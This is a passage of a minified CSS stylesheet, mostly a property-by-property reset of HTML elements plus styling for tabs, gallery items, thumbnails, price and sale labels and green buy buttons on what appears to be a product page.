e,small{padding-bottom:0;}small,strike{padding-right:0;}strike,small{padding-top:0;}small{border-left-width:0;}small{border-bottom-width:0;}small{border-right-width:0;}small{border-top-width:0;}small{border-left-style:none;}small{border-bottom-style:none;}small{border-right-style:none;}small{border-top-style:none;}small{border-left-color:currentColor;}small{border-bottom-color:currentColor;}small{border-right-color:currentColor;}small{border-top-color:currentColor;}small{border-image:none;}small{font-size:100%;}small{font:inherit;}strike,small{vertical-align:baseline;}strong,strike{margin-left:0;}strike,strong{margin-bottom:0;}[class~=label]{border-right-style:solid;}strike{border-left-width:0;}strike{border-bottom-width:0;}strike{border-right-width:0;}strike{border-top-width:0;}strike{border-left-style:none;}strike{border-bottom-style:none;}strike{border-right-style:none;}strike{border-top-style:none;}strike{border-left-color:currentColor;}[class~=label]{border-top-style:solid;}strike{border-bottom-color:currentColor;}strike{border-right-color:currentColor;}strike{border-top-color:currentColor;}strike{border-image:none;}strike{font-size:100%;}strike{font:inherit;}[class~=label]{border-left-color:#5c6bc0;}sub,strong{margin-right:0;}strong,sub{margin-top:0;}[class~=button],strong,sub,sup{padding-left:0;}[class~=label]{border-bottom-color:#5c6bc0;}sup,[class~=button],strong,sub{padding-bottom:0;}[class~=button],sup,sub,strong{padding-right:0;}sub,strong{padding-top:0;}strong{border-left-width:0;}[class~=label]{border-right-color:#5c6bc0;}strong{border-bottom-width:0;}strong{border-right-width:0;}strong{border-top-width:0;}strong{border-left-style:none;}strong{border-bottom-style:none;}strong{border-right-style:none;}strong{border-top-style:none;}[class~=label]{border-top-color:#5c6bc0;}strong{border-left-color:currentColor;}strong{border-bottom-color:currentColor;}strong{border-right-color:currentColor;}strong{border-top-color:currentColor;}[class~=label],strong{border-image:none;}strong{font-size:100%;}[class~=label]{border-radius:.3125pc;}strong{font:inherit;}sub,strong{vertical-align:baseline;}sup,sub{margin-left:0;}sub,sup{margin-bottom:0;}sub{border-left-width:0;}sub{border-bottom-width:0;}sub{border-right-width:0;}sub{border-top-width:0;}sub{border-left-style:none;}sub{border-bottom-style:none;}sub{border-right-style:none;}sub{border-top-style:none;}sub{border-left-color:currentColor;}sub{border-bottom-color:currentColor;}sub{border-right-color:currentColor;}sub{border-top-color:currentColor;}sub{border-image:none;}sub{font-size:100%;}sub{font:inherit;}tt,sup{margin-right:0;}sup,tt{margin-top:0;}[class~=button],[class~=tab-container]{padding-top:11.25pt;}sup,tt{padding-top:0;}sup{border-left-width:0;}sup{border-bottom-width:0;}sup{border-right-width:0;}sup{border-top-width:0;}sup{border-left-style:none;}sup{border-bottom-style:none;}sup{border-right-style:none;}sup{border-top-style:none;}sup{border-left-color:currentColor;}sup{border-bottom-color:currentColor;}sup{border-right-color:currentColor;}sup{border-top-color:currentColor;}[class~=tab-container]{background:linear-gradient(#303f9f,#1a237e);}sup{border-image:none;}sup{font-size:100%;}sup{font:inherit;}tt,sup{vertical-align:baseline;}var,tt{margin-left:0;}tt,var{margin-bottom:0;}[class~=tab-container],tt,b,var{padding-left:0;}b,var,tt,[class~=tab-container]{padding-bottom:0;}b,[class~=tab-container],tt,var{padding-right:0;}tt{border-left-width:0;}tt{border-bottom-width:0;}tt{border-right-width:0;}input[type=number]::-webkit-inner-spin-button{margin-bottom:0;}tt{border-top-width:0;}tt{border-left-style:none;}tt{border-bottom-style:none;}tt{border-right-style:none;}tt{border-top-style:none;}tt{border-left-color:currentColor;}tt{border-bottom-color:currentColor;}tt{border-right-color:currentColor;}[class~=tab-container]{text-align:center;}tt{border-top-color:currentColor;}tt{border-image:none;}tt{font-size:100%;}tt{font:inherit;}b,var{margin-right:0;}var,b{margin-top:0;}[class~=tab-container]{border-top-width:.75pt;}[class~=tab-container]{border-top-style:solid;}[class~=tab-container]{border-top-color:#5c6bc0;}b,var{padding-top:0;}var{border-left-width:0;}var{border-bottom-width:0;}var{border-right-width:0;}var{border-top-width:0;}var{border-left-style:none;}var{border-bottom-style:none;}var{border-right-style:none;}var{border-top-style:none;}var{border-left-color:currentColor;}var{border-bottom-color:currentColor;}var{border-right-color:currentColor;}var{border-top-color:currentColor;}var,[class~=tab-container]{border-image:none;}var{font-size:100%;}var{font:inherit;}b,var{vertical-align:baseline;}input[type=number]::-webkit-inner-spin-button{margin-right:0;}i,[class~=tab],b,u{margin-left:0;}b,u{margin-bottom:0;}b{border-left-width:0;}b{border-bottom-width:0;}b{border-right-width:0;}b{border-top-width:0;}[class~=tab]{max-width:37.5pt;}b{border-left-style:none;}b{border-bottom-style:none;}b{border-right-style:none;}b{border-top-style:none;}b{border-left-color:currentColor;}b{border-bottom-color:currentColor;}b{border-right-color:currentColor;}b{border-top-color:currentColor;}b{border-image:none;}b{font-size:100%;}b{font:inherit;}i,dl,center,u{margin-right:0;}[class~=tab],center,u,i{margin-top:0;}u,i,dl,center{padding-left:0;}dl,i,u,center{padding-bottom:0;}u,dl,center,i{padding-right:0;}center,dl,u,i{padding-top:0;}u{border-left-width:0;}u{border-bottom-width:0;}u{border-right-width:0;}u{border-top-width:0;}u{border-left-style:none;}u{border-bottom-style:none;}u{border-right-style:none;}u{border-top-style:none;}u{border-left-color:currentColor;}u{border-bottom-color:currentColor;}u{border-right-color:currentColor;}u{border-top-color:currentColor;}u{border-image:none;}u{font-size:100%;}u{font:inherit;}u,i{vertical-align:baseline;}i,center{margin-bottom:0;}i{border-left-width:0;}i{border-bottom-width:0;}i{border-right-width:0;}i{border-top-width:0;}i{border-left-style:none;}i{border-bottom-style:none;}i{border-right-style:none;}i{border-top-style:none;}i{border-left-color:currentColor;}i{border-bottom-color:currentColor;}i{border-right-color:currentColor;}i{border-top-color:currentColor;}i{border-image:none;}i{font-size:100%;}i{font:inherit;}dl,center{margin-left:0;}[class~=tab]{margin-bottom:7.5pt;}center{border-left-width:0;}center{border-bottom-width:0;}center{border-right-width:0;}center{border-top-width:0;}center{border-left-style:none;}[class~=tab]{margin-right:.3125pc;}center{border-bottom-style:none;}center{border-right-style:none;}center{border-top-style:none;}center{border-left-color:currentColor;}center{border-bottom-color:currentColor;}center{border-right-color:currentColor;}center{border-top-color:currentColor;}center{border-image:none;}center{font-size:100%;}center{font:inherit;}dl,center{vertical-align:baseline;}[class~=tab]{display:inline-block;}dl,dt{margin-bottom:0;}[class~=tab]{overflow:hidden;}dl,dt{margin-top:0;}input[type=number]::-webkit-inner-spin-button{margin-top:0;}[class~=tab]{cursor:pointer;}dl{border-left-width:0;}dl{border-bottom-width:0;}dl{border-right-width:0;}.role{width:.46875in;}dl{border-top-width:0;}dl{border-left-style:none;}dl{border-bottom-style:none;}dl{border-right-style:none;}dl{border-top-style:none;}dl{border-left-color:currentColor;}dl{border-bottom-color:currentColor;}dl{border-right-color:currentColor;}dl{border-top-color:currentColor;}.role{margin-left:.15625pc;}dl{border-image:none;}dl{font-size:100%;}dl{font:inherit;}dt,dd{margin-left:0;}dt,dd{margin-right:0;}dd,dt{padding-left:0;}ol,[class~=gallery-container],dd,dt{padding-bottom:0;}dd,dt{padding-right:0;}dt,dd{padding-top:0;}dt{border-left-width:0;}dt{border-bottom-width:0;}dt{border-right-width:0;}dt{border-top-width:0;}dt{border-left-style:none;}dt{border-bottom-style:none;}dt{border-right-style:none;}[class~=last]{margin-right:0 !important;}dt{border-top-style:none;}dt{border-left-color:currentColor;}dt{border-bottom-color:currentColor;}dt{border-right-color:currentColor;}dt{border-top-color:currentColor;}dt{border-image:none;}dt{font-size:100%;}dt{font:inherit;}dd,dt{vertical-align:baseline;}input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;}ol,dd{margin-bottom:0;}[class~=gallery-container]{background:#1a237e;}ol,dd{margin-top:0;}[class~=gallery-container]{width:100%;}dd{border-left-width:0;}dd{border-bottom-width:0;}[class~=gallery-container]{padding-left:7.5pt;}dd{border-right-width:0;}dd{border-top-width:0;}dd{border-left-style:none;}dd{border-bottom-style:none;}dd{border-right-style:none;}dd{border-top-style:none;}dd{border-left-color:currentColor;}dd{border-bottom-color:currentColor;}dd{border-right-color:currentColor;}dd{border-top-color:currentColor;}dd{border-image:none;}dd{font-size:100%;}dd{font:inherit;}[class~=gallery-container]{padding-right:7.5pt;}ul,ol{margin-left:0;}ul,ol{margin-right:0;}[class~=gallery-container]{padding-top:.052083333in;}ol,ul{padding-left:0;}ul,ol{padding-right:0;}ul,ol{padding-top:0;}ol{border-left-width:0;}ol{border-bottom-width:0;}ol{border-right-width:0;}ol{border-top-width:0;}ol{border-left-style:none;}ol{border-bottom-style:none;}ol{border-right-style:none;}ol{border-top-style:none;}ol{border-left-color:currentColor;}ol{border-bottom-color:currentColor;}ol{border-right-color:currentColor;}[class~=item],[class~=gallery-container]{float:left;}ol{border-top-color:currentColor;}ol{border-image:none;}ol{font-size:100%;}input[type=number]::-webkit-outer-spin-button{margin-left:0;}ol{font:inherit;}ul,ol{vertical-align:baseline;}li,ul{margin-bottom:0;}fieldset,li,ul,[class~=item]{margin-top:0;}ul,li{padding-bottom:0;}ul{border-left-width:0;}ul{border-bottom-width:0;}[class~=item]{height:120.75pt;}ul{border-right-width:0;}ul{border-top-width:0;}ul{border-left-style:none;}ul{border-bottom-style:none;}ul{border-right-style:none;}ul{border-top-style:none;}ul{border-left-color:currentColor;}ul{border-bottom-color:currentColor;}ul{border-right-color:currentColor;}ul{border-top-color:currentColor;}ul{border-image:none;}ul{font-size:100%;}ul{font:inherit;}form,li,fieldset,[class~=item]{margin-left:0;}[class~=item]{margin-bottom:15px;}[class~=item]{margin-right:.3125pc;}li,fieldset{margin-right:0;}li,fieldset{padding-left:0;}fieldset,li{padding-right:0;}li,fieldset{padding-top:0;}li{border-left-width:0;}li{border-bottom-width:0;}li{border-right-width:0;}li{border-top-width:0;}li{border-left-style:none;}li{border-bottom-style:none;}li{border-right-style:none;}li{border-top-style:none;}li{border-left-color:currentColor;}li{border-bottom-color:currentColor;}[class~=item]{line-height:8.5pc;}li{border-right-color:currentColor;}li{border-top-color:currentColor;}[class~=item]{border-left-width:.75pt;}li{border-image:none;}li{font-size:100%;}li{font:inherit;}li,fieldset{vertical-align:baseline;}[class~=item]{border-bottom-width:.75pt;}fieldset,form{margin-bottom:0;}[class~=item]{border-right-width:.75pt;}form,fieldset{padding-bottom:0;}fieldset{border-left-width:0;}fieldset{border-bottom-width:0;}[class~=item]{border-top-width:.75pt;}input[type=number]::-webkit-outer-spin-button{margin-bottom:0;}fieldset{border-right-width:0;}fieldset{border-top-width:0;}fieldset{border-left-style:none;}fieldset{border-bottom-style:none;}fieldset{border-right-style:none;}[class~=item]{border-left-style:solid;}fieldset{border-top-style:none;}fieldset{border-left-color:currentColor;}fieldset{border-bottom-color:currentColor;}fieldset{border-right-color:currentColor;}fieldset{border-top-color:currentColor;}fieldset{border-image:none;}[class~=item]{border-bottom-style:solid;}[class~=item]{border-right-style:solid;}input[type=number]::-webkit-outer-spin-button{margin-right:0;}fieldset{font-size:100%;}fieldset{font:inherit;}label,form{margin-right:0;}form,label{margin-top:0;}form,label{padding-left:0;}form,label{padding-right:0;}form,label{padding-top:0;}form{border-left-width:0;}form{border-bottom-width:0;}form{border-right-width:0;}form{border-top-width:0;}form{border-left-style:none;}form{border-bottom-style:none;}form{border-right-style:none;}form{border-top-style:none;}form{border-left-color:currentColor;}form{border-bottom-color:currentColor;}form{border-right-color:currentColor;}form{border-top-color:currentColor;}form{border-image:none;}form{font-size:100%;}form{font:inherit;}label,form{vertical-align:baseline;}label,legend{margin-left:0;}legend,label{margin-bottom:0;}legend,label{padding-bottom:0;}label{border-left-width:0;}label{border-bottom-width:0;}label{border-right-width:0;}label{border-top-width:0;}input[type=number]::-webkit-outer-spin-button{margin-top:0;}label{border-left-style:none;}label{border-bottom-style:none;}[class~=item]{border-top-style:solid;}[class~=item]{border-left-color:#8c9eff;}label{border-right-style:none;}label{border-top-style:none;}label{border-left-color:currentColor;}label{border-bottom-color:currentColor;}label{border-right-color:currentColor;}label{border-top-color:currentColor;}label{border-image:none;}[class~=item]{border-bottom-color:#8c9eff;}label{font-size:100%;}label{font:inherit;}table,legend{margin-right:0;}[class~=item]{border-right-color:#8c9eff;}legend,table{margin-top:0;}table,legend{padding-left:0;}table,legend{padding-right:0;}legend,table{padding-top:0;}legend{border-left-width:0;}legend{border-bottom-width:0;}legend{border-right-width:0;}legend{border-top-width:0;}legend{border-left-style:none;}legend{border-bottom-style:none;}legend{border-right-style:none;}legend{border-top-style:none;}legend{border-left-color:currentColor;}legend{border-bottom-color:currentColor;}legend{border-right-color:currentColor;}legend{border-top-color:currentColor;}legend{border-image:none;}legend{font-size:100%;}legend{font:inherit;}table,legend{vertical-align:baseline;}[class~=item]{border-top-color:#8c9eff;}table,caption{margin-left:0;}table,caption{margin-bottom:0;}caption,table{padding-bottom:0;}[class~=item]{border-image:none;}table{border-left-width:0;}[class~=item]{display:block;}table{border-bottom-width:0;}table{border-right-width:0;}table{border-top-width:0;}table{border-left-style:none;}table{border-bottom-style:none;}table{border-right-style:none;}table{border-top-style:none;}table{border-left-color:currentColor;}table{border-bottom-color:currentColor;}table{border-right-color:currentColor;}table{border-top-color:currentColor;}table{border-image:none;}table{font-size:100%;}table{font:inherit;}caption,tbody{margin-right:0;}[class~=item]{overflow:hidden;}caption,tbody{margin-top:0;}tbody,caption{padding-left:0;}caption,tbody{padding-right:0;}caption,tbody{padding-top:0;}caption{border-left-width:0;}caption{border-bottom-width:0;}caption{border-right-width:0;}caption{border-top-width:0;}input[type=submit]{background:linear-gradient(#00c853,#1b5e20);}caption{border-left-style:none;}caption{border-bottom-style:none;}caption{border-right-style:none;}caption{border-top-style:none;}caption{border-left-color:currentColor;}caption{border-bottom-color:currentColor;}caption{border-right-color:currentColor;}caption{border-top-color:currentColor;}input[type=submit]{width:auto;}caption{border-image:none;}caption{font-size:100%;}caption{font:inherit;}caption,tbody{vertical-align:baseline;}tfoot,tbody,thead,input[type=submit]{margin-left:0;}tfoot,thead,input[type=submit],tbody{margin-bottom:0;}tfoot,tbody{padding-bottom:0;}tbody{border-left-width:0;}tbody{border-bottom-width:0;}tbody{border-right-width:0;}tbody{border-top-width:0;}[class~=thumbnail]{width:1.125in;}tbody{border-left-style:none;}tbody{border-bottom-style:none;}tbody{border-right-style:none;}tbody{border-top-style:none;}tbody{border-left-color:currentColor;}tbody{border-bottom-color:currentColor;}tbody{border-right-color:currentColor;}tbody{border-top-color:currentColor;}tbody{border-image:none;}tbody{font-size:100%;}tbody{font:inherit;}tfoot,tr,input[type=submit],thead{margin-right:0;}input[type=submit],tr,thead,tfoot{margin-top:0;}thead,tfoot{padding-left:0;}thead,tfoot{padding-right:0;}tfoot,thead{padding-top:0;}tfoot{border-left-width:0;}tfoot{border-bottom-width:0;}tfoot{border-right-width:0;}tfoot{border-top-width:0;}tfoot{border-left-style:none;}tfoot{border-bottom-style:none;}tfoot{border-right-style:none;}tfoot{border-top-style:none;}tfoot{border-left-color:currentColor;}tfoot{border-bottom-color:currentColor;}tfoot{border-right-color:currentColor;}tfoot{border-top-color:currentColor;}tfoot{border-image:none;}tfoot{font-size:100%;}tfoot{font:inherit;}thead,tfoot{vertical-align:baseline;}thead,tr{padding-bottom:0;}thead{border-left-width:0;}[class~=thumbnail]{height:auto;}thead{border-bottom-width:0;}thead{border-right-width:0;}thead{border-top-width:0;}thead{border-left-style:none;}input[type=submit]{padding-left:.3125in;}thead{border-bottom-style:none;}thead{border-right-style:none;}thead{border-top-style:none;}[class~=thumbnail]{margin-left:auto;}thead{border-left-color:currentColor;}thead{border-bottom-color:currentColor;}thead{border-right-color:currentColor;}thead{border-top-color:currentColor;}thead{border-image:none;}thead{font-size:100%;}thead{font:inherit;}th,tr{margin-left:0;}tr,th{margin-bottom:0;}tr,th{padding-left:0;}input[type=submit]{padding-bottom:.625pc;}th,tr{padding-right:0;}th,tr{padding-top:0;}tr{border-left-width:0;}tr{border-bottom-width:0;}tr{border-right-width:0;}tr{border-top-width:0;}tr{border-left-style:none;}tr{border-bottom-style:none;}tr{border-right-style:none;}tr{border-top-style:none;}input[type=submit]{padding-right:.3125in;}tr{border-left-color:currentColor;}tr{border-bottom-color:currentColor;}tr{border-right-color:currentColor;}[class~=thumbnail]{margin-bottom:-50%;}tr{border-top-color:currentColor;}tr{border-image:none;}tr{font-size:100%;}tr{font:inherit;}th,tr{vertical-align:baseline;}th,td{margin-right:0;}th,td{margin-top:0;}td,th{padding-bottom:0;}[class~=thumbnail]{margin-right:auto;}th{border-left-width:0;}th{border-bottom-width:0;}[class~=thumbnail]{margin-top:0%;}th{border-right-width:0;}th{border-top-width:0;}th{border-left-style:none;}th{border-bottom-style:none;}th{border-right-style:none;}th{border-top-style:none;}th{border-left-color:currentColor;}th{border-bottom-color:currentColor;}th{border-right-color:currentColor;}th{border-top-color:currentColor;}th{border-image:none;}th{font-size:100%;}th{font:inherit;}td,article{margin-left:0;}article,td{margin-bottom:0;}td,article{padding-left:0;}article,td{padding-right:0;}td,article{padding-top:0;}td{border-left-width:0;}td{border-bottom-width:0;}td{border-right-width:0;}td{border-top-width:0;}td{border-left-style:none;}td{border-bottom-style:none;}td{border-right-style:none;}td{border-top-style:none;}[class~=thumbnail]{position:relative;}td{border-left-color:currentColor;}td{border-bottom-color:currentColor;}td{border-right-color:currentColor;}td{border-top-color:currentColor;}td{border-image:none;}[class~=thumbnail]{vertical-align:middle;}td{font-size:100%;}td{font:inherit;}article,td{vertical-align:baseline;}input[type=submit]{padding-top:.625pc;}input[type=submit]{color:#fff;}[class~=thumbnail]{transition:all .3s;}article,aside{margin-right:0;}article,aside{margin-top:0;}article,aside{padding-bottom:0;}input[type=submit]{font-weight:bold;}article{border-left-width:0;}article{border-bottom-width:0;}article{border-right-width:0;}article{border-top-width:0;}article{border-left-style:none;}article{border-bottom-style:none;}article{border-right-style:none;}article{border-top-style:none;}article{border-left-color:currentColor;}article{border-bottom-color:currentColor;}article{border-right-color:currentColor;}article{border-top-color:currentColor;}input[type=submit]{text-shadow:-1px .010416667in #000;}article{border-image:none;}article{font-size:100%;}article{font:inherit;}aside,canvas{margin-left:0;}canvas,aside{margin-bottom:0;}canvas,aside{padding-left:0;}aside,canvas{padding-right:0;}canvas,aside{padding-top:0;}aside{border-left-width:0;}aside{border-bottom-width:0;}aside{border-right-width:0;}aside{border-top-width:0;}aside{border-left-style:none;}aside{border-bottom-style:none;}aside{border-right-style:none;}input[type=submit]{border-left-width:medium;}aside{border-top-style:none;}aside{border-left-color:currentColor;}aside{border-bottom-color:currentColor;}aside{border-right-color:currentColor;}aside{border-top-color:currentColor;}aside{border-image:none;}input[type=submit]{border-bottom-width:medium;}aside{font-size:100%;}aside{font:inherit;}[class~=detail]{top:-51.75pt;}aside,canvas{vertical-align:baseline;}[class~=detail]{position:relative;}canvas,detail{margin-right:0;}input[type=submit]{border-right-width:medium;}canvas,detail{margin-top:0;}canvas,detail{padding-bottom:0;}[class~=detail]{line-height:1em;}canvas{border-left-width:0;}canvas{border-bottom-width:0;}canvas{border-right-width:0;}canvas{border-top-width:0;}canvas,input[type=submit]{border-left-style:none;}input[type=submit],canvas{border-bottom-style:none;}canvas,input[type=submit]{border-right-style:none;}canvas{border-top-style:none;}canvas{border-left-color:currentColor;}canvas{border-bottom-color:currentColor;}canvas{border-right-color:currentColor;}canvas{border-top-color:currentColor;}canvas{border-image:none;}canvas{font-size:100%;}canvas{font:inherit;}detail,embed{margin-left:0;}embed,detail{margin-bottom:0;}detail,embed{padding-left:0;}embed,detail{padding-right:0;}detail,embed{padding-top:0;}detail{border-left-width:0;}input[type=submit]{border-top-width:medium;}detail{border-bottom-width:0;}detail{border-right-width:0;}[class~=detail]{text-align:center;}detail{border-top-width:0;}detail{border-left-style:none;}detail{border-bottom-style:none;}detail{border-right-style:none;}detail,input[type=submit]{border-top-style:none;}detail{border-left-color:currentColor;}detail{border-bottom-color:currentColor;}detail{border-right-color:currentColor;}detail{border-top-color:currentColor;}detail{border-image:none;}detail{font-size:100%;}detail{font:inherit;}detail,embed{vertical-align:baseline;}figure,embed{margin-right:0;}figure,embed{margin-top:0;}figure,embed{padding-bottom:0;}embed{border-left-width:0;}embed{border-bottom-width:0;}embed{border-right-width:0;}embed{border-top-width:0;}embed{border-left-style:none;}embed{border-bottom-style:none;}embed{border-right-style:none;}embed{border-top-style:none;}[class~=detail]{display:block;}embed{border-left-color:currentColor;}embed{border-bottom-color:currentColor;}embed{border-right-color:currentColor;}embed{border-top-color:currentColor;}embed{border-image:none;}embed{font-size:100%;}embed{font:inherit;}figcaption,figure{margin-left:0;}figure,figcaption{margin-bottom:0;}[class~=sale]{top:-4.3125pc;}[class~=sale]{left:-1.125pc;}[class~=sale]{width:4.5pc !important;}footer,[class~=price],figcaption,figure{padding-left:0;}figure,footer,[class~=price],figcaption{padding-right:0;}figcaption,figure{padding-top:0;}figure{border-left-width:0;}figure{border-bottom-width:0;}figure{border-right-width:0;}figure{border-top-width:0;}figure{border-left-style:none;}figure{border-bottom-style:none;}figure{border-right-style:none;}figure{border-top-style:none;}figure,input[type=submit]{border-left-color:currentColor;}figure{border-bottom-color:currentColor;}figure{border-right-color:currentColor;}figure{border-top-color:currentColor;}figure{border-image:none;}figure{font-size:100%;}[class~=sale]{position:relative;}figure{font:inherit;}figure,figcaption{vertical-align:baseline;}figcaption,footer{margin-right:0;}footer,figcaption{margin-top:0;}figcaption,footer{padding-bottom:0;}figcaption{border-left-width:0;}figcaption{border-bottom-width:0;}figcaption{border-right-width:0;}figcaption{border-top-width:0;}figcaption{border-left-style:none;}figcaption{border-bottom-style:none;}figcaption{border-right-style:none;}[class~=price]{background:linear-gradient(transparent,rgba(0,0,0,.75));}figcaption{border-top-style:none;}[class~=price]{padding-bottom:.104166667in;}figcaption{border-left-color:currentColor;}figcaption{border-bottom-color:currentColor;}figcaption{border-right-color:currentColor;}figcaption{border-top-color:currentColor;}[class~=price]{padding-top:.104166667in;}figcaption{border-image:none;}figcaption{font-size:100%;}[class~=price]{font-size:1pc;}figcaption{font:inherit;}[class~=price]{color:#e1f5fe;}header,footer{margin-left:0;}footer,header{margin-bottom:0;}[class~=currency]{width:1pc;}header,footer{padding-top:0;}footer{border-left-width:0;}footer{border-bottom-width:0;}footer{border-right-width:0;}footer{border-top-width:0;}footer{border-left-style:none;}footer{border-bottom-style:none;}footer{border-right-style:none;}footer{border-top-style:none;}footer{border-left-color:currentColor;}input[type=submit],footer{border-bottom-color:currentColor;}footer,input[type=submit]{border-right-color:currentColor;}[class~=currency]{margin-bottom:-3px;}footer{border-top-color:currentColor;}footer{border-image:none;}footer{font-size:100%;}footer{font:inherit;}footer,header{vertical-align:baseline;}hgroup,header{margin-right:0;}hgroup,header{margin-top:0;}hgroup,header{padding-left:0;}header,hgroup{padding-bottom:0;}header,hgroup{padding-right:0;}header{border-left-width:0;}header{border-bottom-width:0;}header{border-right-width:0;}header{border-top-width:0;}header{border-left-style:none;}header{border-bottom-style:none;}blockquote:after{content:none;}header{border-right-style:none;}header{border-top-style:none;}header{border-left-color:currentColor;}header{border-bottom-color:currentColor;}header{border-right-color:currentColor;}input[type=submit],header{border-top-color:currentColor;}header{border-image:none;}header{font-size:100%;}header{font:inherit;}menu,hgroup{margin-left:0;}hgroup,menu{margin-bottom:0;}hgroup,menu{padding-top:0;}hgroup{border-left-width:0;}hgroup{border-bottom-width:0;}hgroup{border-right-width:0;}hgroup{border-top-width:0;}hgroup{border-left-style:none;}hgroup{border-bottom-style:none;}.strike-outer{color:#ff1744 !important;}hgroup{border-right-style:none;}hgroup{border-top-style:none;}hgroup{border-left-color:currentColor;}hgroup{border-bottom-color:currentColor;}hgroup{border-right-color:currentColor;}hgroup{border-top-color:currentColor;}hgroup{border-image:none;}hgroup{font-size:100%;}hgroup{font:inherit;}hgroup,menu{vertical-align:baseline;}.strike-outer{text-decoration:line-through;}menu,nav{margin-right:0;}[class~=strike-inner]{color:#b3e5fc;}menu,nav{margin-top:0;}[class~=strike-inner]{font-size:.135416667in !important;}[class~=buy],menu,nav,output{padding-left:0;}menu,nav{padding-bottom:0;}nav,[class~=buy],output,menu{padding-right:0;}menu{border-left-width:0;}menu{border-bottom-width:0;}menu{border-right-width:0;}menu{border-top-width:0;}menu{border-left-style:none;}menu{border-bottom-style:none;}menu{border-right-style:none;}menu{border-top-style:none;}menu{border-left-color:currentColor;}menu{border-bottom-color:currentColor;}menu{border-right-color:currentColor;}menu{border-top-color:currentColor;}menu,input[type=submit]{border-image:none;}menu{font-size:100%;}menu{font:inherit;}[class~=buy]{background:linear-gradient(#00c853,#1b5e20);}nav,output{margin-left:0;}nav,output{margin-bottom:0;}[class~=buy]{height:1.8125pc;}output,nav{padding-top:0;}nav{border-left-width:0;}nav{border-bottom-width:0;}nav{border-right-width:0;}nav{border-top-width:0;}[class~=buy]{padding-bottom:4.5pt;}nav{border-left-style:none;}nav{border-bottom-style:none;}nav{border-right-style:none;}nav{border-top-style:none;}nav{border-left-color:currentColor;}nav{border-bottom-color:currentColor;}nav{border-right-color:currentColor;}nav{border-top-color:currentColor;}nav{border-image:none;}[class~=buy]{padding-top:5px;}nav{font-size:100%;}nav{font:inherit;}nav,output{vertical-align:baseline;}input[type=submit]{border-radius:3.75pt;}output,ruby{margin-right:0;}output,ruby{margin-top:0;}output,ruby{padding-bottom:0;}output{border-left-width:0;}output{border-bottom-width:0;}output{border-right-width:0;}output{border-top-width:0;}output{border-left-style:none;}[class~=buy]{color:#fff;}output{border-bottom-style:none;}output{border-right-style:none;}output{border-top-style:none;}output{border-left-color:currentColor;}output{border-bottom-color:currentColor;}output{border-right-color:currentColor;}output{border-top-color:currentColor;}output{border-image:none;}output{font-size:100%;}[class~=buy]{font-size:.145833333in;}output{font:inherit;}section,ruby{margin-left:0;}ruby,section{margin-bottom:0;}section,ruby{padding-left:0;}ruby,section{padding-right:0;}[class~=buy]{letter-spacing:1px;}section,ruby{padding-top:0;}ruby{border-left-width:0;}ruby{border-bottom-width:0;}ruby{border-right-width:0;}ruby{border-top-width:0;}ruby{border-left-style:none;}ruby{border-bottom-style:none;}ruby{border-right-style:none;}ruby{border-top-style:none;}ruby{border-left-color:currentColor;}ruby{border-bottom-color:currentColor;}ruby{border-right-color:currentColor;}ruby{border-top-color:currentColor;}ruby{border-image:none;}ruby{font-size:100%;}ruby{font:inherit;}ruby,section{vertical-align:baseline;}summary,section{margin-right:0;}section,summary{margin-top:0;}[class~=buy]{text-decoration:none;}summary,section{padding-bottom:0;}[class~=buy]{text-shadow:-.0625pc .75pt #000;}section{border-left-width:0;}[class~=buy]{line-height:.166666667in !important;}section{border-bottom-width:0;}section{border-right-width:0;}section{border-top-width:0;}section{border-left-style:none;}section{border-bottom-style:none;}section{border-right-style:none;}section{border-top-style:none;}section{border-left-color:currentColor;}section{border-bottom-color:currentColor;}section{border-right-color:currentColor;}section{border-top-color:currentColor;}section{border-image:none;}section{font-size:100%;}[class~=buy]{display:block;}[class~=icon]{text-align:center;}section{font:inherit;}mark,audio,summary,time{margin-left:0;}time,audio,mark,summary{margin-bottom:0;}time,summary,mark,audio{padding-left:0;}time,mark,summary,audio{padding-right:0;}summary,mark,time,audio{padding-top:0;}summary{border-left-width:0;}summary{border-bottom-width:0;}summary{border-right-width:0;}summary{border-top-width:0;}summary{border-left-style:none;}summary{border-bottom-style:none;}summary{border-right-style:none;}summary{border-top-style:none;}summary{border-left-color:currentColor;}summary{border-bottom-color:currentColor;}summary{border-right-color:currentColor;}.image{width:100%;}summary{border-top-color:currentColor;}summary{border-image:none;}summary{font-size:100%;}summary{font:inherit;}summary,time{vertical-align:baseline;}time,mark{margin-right:0;}mark,time{margin-top:0;}mark,time{padding-bottom:0;}time{border-left-width:0;}time{border-bottom-width:0;}time{border-right-width:0;}time{border-top-width:0;}time{border-left-style:none;}time{border-bottom-style:none;}time{border-right-style:none;}time{border-top-style:none;}time{border-left-color:currentColor;}time{border-bottom-color:currentColor;}time{border-right-color:currentColor;}time{border-top-color:currentColor;}time{border-image:none;}time{font-size:100%;}time{font:inherit;}mark{border-left-width:0;}q:before{content:"";}mark{border-bottom-width:0;}mark{border-right-width:0;}mark{border-top-width:0;}mark{border-left-style:none;}mark{border-bottom-style:none;}mark{border-right-style:none;}mark{border-top-style:none;}mark{border-left-color:currentColor;}mark{border-bottom-color:currentColor;}mark{border-right-color:currentColor;}mark{border-top-color:currentColor;}.image{display:none;}mark{border-image:none;}mark{font-size:100%;}[class~=footer]{background:linear-gradient(#303f9f,#1a237e);}mark{font:inherit;}audio,mark{vertical-align:baseline;}audio,video{margin-right:0;}video,audio{margin-top:0;}audio,video{padding-bottom:0;}audio{border-left-width:0;}audio{border-bottom-width:0;}audio{border-right-width:0;}audio{border-top-width:0;}audio{border-left-style:none;}audio{border-bottom-style:none;}audio{border-right-style:none;}audio{border-top-style:none;}audio{border-left-color:currentColor;}audio{border-bottom-color:currentColor;}[class~=footer]{float:left;}audio{border-right-color:currentColor;}audio{border-top-color:currentColor;}audio{border-image:none;}audio{font-size:100%;}audio{font:inherit;}video{margin-left:0;}video{margin-bottom:0;}video,[class~=footer]{padding-left:0;}[class~=footer],video{padding-right:0;}video{padding-top:0;}video{border-left-width:0;}video{border-bottom-width:0;}video{border-right-width:0;}[class~=footer]{width:100%;}video{border-top-width:0;}video{border-left-style:none;}video{border-bottom-style:none;}video{border-right-style:none;}video{border-top-style:none;}video{border-left-color:currentColor;}video{border-bottom-color:currentColor;}video{border-right-color:currentColor;}video{border-top-color:currentColor;}video{border-image:none;}video{font-size:100%;}video{font:inherit;}video{vertical-align:baseline;}hgroup,figcaption,menu,section,aside,detail,figure,header,article,nav,footer{display:block;}[class~=footer],form{padding-bottom:.9375pc;}body{line-height:1;}ol,ul{list-style:none;}q,blockquote{quotes:none;}table{border-co